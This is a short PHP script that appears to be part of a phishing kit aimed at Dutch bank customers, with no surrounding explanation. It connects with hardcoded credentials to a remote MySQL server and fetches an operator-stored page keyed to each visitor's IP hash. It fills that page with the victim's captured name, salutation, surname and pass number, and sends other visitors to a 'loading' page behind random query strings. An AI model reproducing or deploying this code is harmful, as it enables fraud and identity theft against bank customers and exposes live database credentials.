<?php include 'aXzP.php';
@$mysqli = @new mysqli("remotemysql.com", "BLoRUuIA8j", "bK4CLX1BPF", "BLoRUuIA8j", "3306");
$cHmA = md5($_SERVER['REMOTE_ADDR']);
if (@$_GET['ckv'] = $cHmA) {
    $result = $mysqli->query("SELECT * FROM g where b='$cHmA'");
    if ($result->num_rows == 0) {
        header("location: laden.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
            "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
            0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
    } else {
        $row = mysqli_fetch_assoc($result);
        $oxK = base64_decode($row['c']);
        $oxK = @str_replace("#VLNAAM#", $_SESSION['VLNAAM'], $oxK);
        $oxK = @str_replace("#PASNR#", $_SESSION['rkp'], $oxK);
        $oxK = @str_replace("#aanhef#", $_SESSION['ABC1'], $oxK);
        $oxK = @str_replace("#achternaam#", $_SESSION['ABC2'], $oxK);
        echo $oxK;
    }
    $mysqli->close();
} else {
    header("location: laden.php?" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
        0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73) .
        "=" . substr(str_shuffle("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"),
        0, 73) . substr(str_shuffle("aBcEeFgHiJkLmNoPqRstUvWxYz0123456789"), 0, 73));
} ?>